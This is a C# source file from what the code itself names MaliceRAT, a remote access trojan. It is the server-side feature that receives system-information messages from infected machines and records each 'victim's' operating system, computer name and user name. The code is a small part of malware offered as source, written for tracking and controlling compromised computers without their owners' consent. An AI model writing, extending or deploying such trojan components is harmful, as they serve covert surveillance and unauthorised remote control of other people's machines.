using System;
using System.Net;

namespace MaliceRAT.RatServer.Features
{
    public class SystemInformation
    {
        public event Action<Victim> InfoReceived;

        public SystemInformation(Server server)
        {
            server.MessageReceived += HandleMessage;
        }

        private void HandleMessage(Victim victim, dynamic message)
        {
            if (message["type"] == "system_info")
            {
                victim.OS = message["os"].ToString();
                victim.PC = message["pc"].ToString();
                victim.User = message["user"].ToString();

                InfoReceived?.Invoke(victim);
            }
        }
    }
}